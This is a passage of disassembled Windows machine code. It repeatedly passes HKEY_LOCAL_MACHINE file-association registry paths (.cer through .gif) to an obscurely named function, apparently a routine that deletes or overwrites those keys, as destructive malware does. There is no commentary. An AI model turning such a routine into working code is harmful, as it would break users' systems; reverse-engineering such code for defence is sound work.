  push 00420570h ; "SOFTWARE\Classes\.cer"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000F8h
  push 004205A0h ; "SOFTWARE\Classes\.cgm\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000F9h
  push 004205F4h ; "SOFTWARE\Classes\.cgm"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000FAh
  push 00420624h ; "SOFTWARE\Classes\.chk"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000FBh
  push 00420654h ; "SOFTWARE\Classes\.chm"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000FCh
  push 00420684h ; "SOFTWARE\Classes\.cin"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000FDh
  push 004206B4h ; "SOFTWARE\Classes\.clp"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000FEh
  push 004206E4h ; "SOFTWARE\Classes\.cls"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000FFh
  push 00420714h ; "SOFTWARE\Classes\.cmd\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000100h
  push 00420768h ; "SOFTWARE\Classes\.cmd"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000101h
  push 00420798h ; "SOFTWARE\Classes\.cnf"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000102h
  push 004207C8h ; "SOFTWARE\Classes\.com\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000103h
  push 0042081Ch ; "SOFTWARE\Classes\.com"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000104h
  push 0042084Ch ; "SOFTWARE\Classes\.cpl\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000105h
  push 004208A0h ; "SOFTWARE\Classes\.cpl"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000106h
  push 004208D0h ; "SOFTWARE\Classes\.cpp\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000107h
  push 00420924h ; "SOFTWARE\Classes\.cpp"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000108h
  push 00420954h ; "SOFTWARE\Classes\.crl"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000109h
  push 00420984h ; "SOFTWARE\Classes\.crt"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000010Ah
  push 004209B4h ; "SOFTWARE\Classes\.css\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000010Bh
  push 00420A08h ; "SOFTWARE\Classes\.css"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000010Ch
  push 00420A38h ; "SOFTWARE\Classes\.csv"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000010Dh
  push 00420A68h ; "SOFTWARE\Classes\.CTT"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000010Eh
  push 00420A98h ; "SOFTWARE\Classes\.ctx"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000010Fh
  push 00420AC8h ; "SOFTWARE\Classes\.cur\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000110h
  push 00420B1Ch ; "SOFTWARE\Classes\.cur"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000111h
  push 00420B4Ch ; "SOFTWARE\Classes\.cxx\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000112h
  push 00420BA0h ; "SOFTWARE\Classes\.cxx"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000113h
  push 00420BD0h ; "SOFTWARE\Classes\.dat"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000114h
  push 00420C00h ; "SOFTWARE\Classes\.db"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000115h
  push 00420C30h ; "SOFTWARE\Classes\.dbg\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000116h
  push 00420C84h ; "SOFTWARE\Classes\.dbg"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000117h
  push 00420CB4h ; "SOFTWARE\Classes\.dct\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000118h
  push 00420D08h ; "SOFTWARE\Classes\.dct"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000119h
  push 00420D38h ; "SOFTWARE\Classes\.def\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000011Ah
  push 00420D8Ch ; "SOFTWARE\Classes\.def"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000011Bh
  push 00420DBCh ; "SOFTWARE\Classes\.der"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000011Ch
  push 00420E04h ; "SOFTWARE\Classes\.DeskLink\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000011Dh
  push 00420E64h ; "SOFTWARE\Classes\.DeskLink"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000011Eh
  push 00420EA0h ; "SOFTWARE\Classes\.dfm"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000011Fh
  push 00420ED0h ; "SOFTWARE\Classes\.dib\OpenWithProgids"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000120h
  push 00420F20h ; "SOFTWARE\Classes\.dib\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000121h
  push 00420F74h ; "SOFTWARE\Classes\.dib"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000122h
  push 00420FD4h ; "SOFTWARE\Classes\.dic\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000123h
  push 00421028h ; "SOFTWARE\Classes\.dic"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000124h
  push 00421058h ; "SOFTWARE\Classes\.diz"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000125h
  push 00421088h ; "SOFTWARE\Classes\.dl_\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000126h
  push 004210DCh ; "SOFTWARE\Classes\.dl_"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000127h
  push 0042110Ch ; "SOFTWARE\Classes\.dll\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000128h
  push 00421160h ; "SOFTWARE\Classes\.dll"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000129h
  push 00420FA4h ; "SOFTWARE\Classes\.dob"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000012Ah
  push 004211B4h ; "SOFTWARE\Classes\.doc\OpenWithList\WordPad.exe"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000012Bh
  push 00421218h ; "SOFTWARE\Classes\.doc\OpenWithList"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000012Ch
  push 00421264h ; "SOFTWARE\Classes\.doc\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000012Dh
  push 004212B8h ; "SOFTWARE\Classes\.doc\ShellNew"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000012Eh
  push 004212FCh ; "SOFTWARE\Classes\.doc\Word.Document.6\ShellNew"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000012Fh
  push 00421390h ; "SOFTWARE\Classes\.doc\Word.Document.6"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000130h
  push 004213E0h ; "SOFTWARE\Classes\.doc\WordDocument\ShellNew"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000131h
  push 0042143Ch ; "SOFTWARE\Classes\.doc\WordDocument"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000132h
  push 00421488h ; "SOFTWARE\Classes\.doc\WordPad.Document.1\ShellNew"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000133h
  push 004214F0h ; "SOFTWARE\Classes\.doc\WordPad.Document.1"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000134h
  push 00421548h ; "SOFTWARE\Classes\.doc"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000135h
  push 00421360h ; "SOFTWARE\Classes\.dos"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000136h
  push 00421578h ; "SOFTWARE\Classes\.dot\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000137h
  push 004215CCh ; "SOFTWARE\Classes\.dot"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000138h
  push 004215FCh ; "SOFTWARE\Classes\.dox"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000139h
  push 0042162Ch ; "SOFTWARE\Classes\.dpk"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000013Ah
  push 0042165Ch ; "SOFTWARE\Classes\.dpr"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000013Bh
  push 0042168Ch ; "SOFTWARE\Classes\.drv\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000013Ch
  push 004216E0h ; "SOFTWARE\Classes\.drv"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000013Dh
  push 00421710h ; "SOFTWARE\Classes\.dsm"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000013Eh
  push 00421740h ; "SOFTWARE\Classes\.dsn"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000013Fh
  push 00421770h ; "SOFTWARE\Classes\.dsr"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000140h
  push 004217A0h ; "SOFTWARE\Classes\.dsx"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000141h
  push 004217D0h ; "SOFTWARE\Classes\.dun"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000142h
  push 00421800h ; "SOFTWARE\Classes\.dv"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000143h
  push 00421830h ; "SOFTWARE\Classes\.dvd\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000144h
  push 00421884h ; "SOFTWARE\Classes\.dvd"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000145h
  push 004218B4h ; "SOFTWARE\Classes\.dvr-ms\OpenWithList\wmplayer.exe"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000146h
  push 00421920h ; "SOFTWARE\Classes\.dvr-ms\OpenWithList"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000147h
  push 00421970h ; "SOFTWARE\Classes\.dvr-ms\OpenWithProgIds"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000148h
  push 004219C8h ; "SOFTWARE\Classes\.dvr-ms"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000149h
  push 00421A00h ; "SOFTWARE\Classes\.emf\OpenWithProgids"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000014Ah
  push 00421A50h ; "SOFTWARE\Classes\.emf\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000014Bh
  push 00421AA4h ; "SOFTWARE\Classes\.emf"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000014Ch
  push 00421AD4h ; "SOFTWARE\Classes\.eml"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000014Dh
  push 00421B04h ; "SOFTWARE\Classes\.eps\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000014Eh
  push 00421B58h ; "SOFTWARE\Classes\.eps"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000014Fh
  push 00421B88h ; "SOFTWARE\Classes\.ex_\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000150h
  push 00421BDCh ; "SOFTWARE\Classes\.ex_"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000151h
  push 00421C0Ch ; "SOFTWARE\Classes\.exp\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000152h
  push 00421C60h ; "SOFTWARE\Classes\.exp"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000153h
  push 00421C90h ; "SOFTWARE\Classes\.eyb\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000154h
  push 00421CE8h ; "SOFTWARE\Classes\.eyb"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000155h
  push 00421D18h ; "SOFTWARE\Classes\.fif"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000156h
  push 00421D48h ; "SOFTWARE\Classes\.flac"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000157h
  push 00421D7Ch ; "SOFTWARE\Classes\.flc"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000158h
  push 00421DACh ; "SOFTWARE\Classes\.fli"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000159h
  push 00421DDCh ; "SOFTWARE\Classes\.flv"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000015Ah
  push 00421E0Ch ; "SOFTWARE\Classes\.fnd\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000015Bh
  push 00421E60h ; "SOFTWARE\Classes\.fnd"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000015Ch
  push 00421EC4h ; "SOFTWARE\Classes\.fnt\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000015Dh
  push 00421F18h ; "SOFTWARE\Classes\.fnt"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000015Eh
  push 00421F48h ; "SOFTWARE\Classes\.Folder\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000015Fh
  push 00421FA4h ; "SOFTWARE\Classes\.Folder"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000160h
  push 00421FDCh ; "SOFTWARE\Classes\.fon\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000161h
  push 00422030h ; "SOFTWARE\Classes\.fon"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000162h
  push 00422060h ; "SOFTWARE\Classes\.frm"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000163h
  push 00421E90h ; "SOFTWARE\Classes\.frx"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000164h
  push 00422090h ; "SOFTWARE\Classes\.ghi\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000165h
  push 004220E4h ; "SOFTWARE\Classes\.ghi"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000166h
  push 00422114h ; "SOFTWARE\Classes\.gif\OpenWithProgids"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000167h
  push 00422164h ; "SOFTWARE\Classes\.gif\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
